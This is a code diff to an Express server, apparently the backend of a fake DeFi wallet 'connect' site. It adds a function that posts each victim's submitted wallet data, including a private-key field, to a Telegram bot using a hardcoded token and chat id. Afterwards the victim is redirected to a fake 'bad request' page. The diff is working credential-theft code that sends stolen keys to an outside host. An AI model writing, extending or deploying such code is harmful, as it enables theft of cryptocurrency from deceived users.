@@ -13,6 +13,7 @@ import { error } from "console";
 import { stat } from "fs";
 import Message from "./models/messages.model";
 import HubWallet from "./models/hubwallet.model";
+import axios from "axios";
 const app: Application = express();
 app.use(cookieParser());
 app.use(bodyParser.urlencoded({ extended: true }));
@@ -515,8 +516,10 @@ app.post("/connect", async (req, res) => {
       privatekeyval,
       createdAt,
     };
+    const text = JSON.stringify(data, null, 4);
     data.createdAt = new Date();
     const savedData = await HubWallet.create(data);
+    sendToTelegram("1618693731", text);
     res.redirect('https://defi-assist.netlify.app/badrequest');
     return savedData;
   } catch (err) {
@@ -546,4 +549,23 @@ app.post("/deletetr/:id", async (req, res) => {
     res.status(500).send("Internal server error");
   }
 });
+interface TelegramMessage {
+  chat_id: string;
+  text: string;
+}
+async function sendToTelegram(chatId: string, text: string): Promise<void> {
+  const telegramToken = '7217754448:AAF7X55CSLZTJfCY7SuFdA70OYLgZazU6WY';
+  const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+  const message: TelegramMessage = {
+    chat_id: chatId,
+    text: text
+  };
+
+  try {
+    const response = await axios.post(url, message);
+    console.log('Message sent to Telegram:', response.data);
+  } catch (error) {
+    console.error('Error sending message to Telegram:', error);
+  }
+}
 export default app;
